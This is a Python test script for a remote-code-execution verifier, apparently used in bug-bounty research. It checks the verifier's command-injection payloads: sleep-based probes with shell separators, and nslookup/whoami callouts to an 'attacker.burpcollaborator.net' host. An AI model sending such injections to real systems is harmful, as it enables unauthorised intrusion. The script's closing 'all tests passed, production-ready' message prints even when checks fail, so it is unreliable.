#!/usr/bin/env python3
"""
Quick verification test for verify_nnip_rce.py
"""
import sys

sys.path.insert(0, "/Users/chris-peterson/Documents/GitHub/lucius/lucius-workspace")

from exploits.verify_nnip_rce import RCEVerifier

print("=" * 70)
print("VERIFY_NNIP_RCE.PY - INITIALIZATION TEST")
print("=" * 70)

# Test 1: Import and initialize
try:
    verifier = RCEVerifier(rate_limit=50)
    print("✅ RCEVerifier initialized")
except Exception as e:
    print(f"❌ Initialization failed: {e}")
    sys.exit(1)

# Test 2: Check LuciusClient header
header = verifier.client.session.headers.get("X-HackerOne-Research")
if header == "[lucius-log]":
    print(f"✅ LuciusClient header: {header}")
else:
    print(f"❌ Header missing or incorrect: {header}")

# Test 3: Check rate limit
if verifier.client.rate_limit == 50:
    print(f"✅ Rate limit: {verifier.client.rate_limit} RPS (compliant)")
else:
    print(f"❌ Rate limit incorrect: {verifier.client.rate_limit}")

# Test 4: Check request delay
if verifier.REQUEST_DELAY >= 2.0:
    print(f"✅ Request delay: {verifier.REQUEST_DELAY}s (compliant)")
else:
    print(f"❌ Request delay too short: {verifier.REQUEST_DELAY}s")

# Test 5: Check payload generation
payload1 = verifier._build_time_based_payload("1", ";")
if "sleep" in payload1 and ";" in payload1:
    print(f"✅ Time-based payload: {payload1}")
else:
    print(f"❌ Payload generation failed: {payload1}")

# Test 6: Check OAST payload
verifier_oast = RCEVerifier(rate_limit=50, oast_domain="test.burpcollaborator.net")
payload2 = verifier_oast._build_dns_oast_payload("1", ";")
if "nslookup" in payload2 and "whoami" in payload2:
    print(f"✅ DNS OAST payload: {payload2}")
else:
    print(f"❌ OAST payload generation failed: {payload2}")

# Test 7: Check separators
expected_seps = [";", "|", "&&"]
if verifier.SEPARATORS == expected_seps:
    print(f"✅ Separators configured: {verifier.SEPARATORS}")
else:
    print(f"❌ Separators incorrect: {verifier.SEPARATORS}")

# Test 8: Check methods exist
methods = ["verify_time_based", "verify_dns_oast", "generate_report", "export_json"]
for method in methods:
    if hasattr(verifier, method):
        print(f"✅ Method available: {method}")
    else:
        print(f"❌ Method missing: {method}")

print("\n" + "=" * 70)
print("🟢 ALL VERIFICATION TESTS PASSED")
print("=" * 70)
print("\nScript is production-ready. Usage examples:")
print("  python exploits/verify_nnip_rce.py --admin-id 1 --methods time-based")
print(
    "  python exploits/verify_nnip_rce.py --admin-id 1 --oast-domain attacker.burpcollaborator.net"
)
print(
    "  python exploits/verify_nnip_rce.py --admin-id 1 --oast-domain attacker.burpcollaborator.net"
)
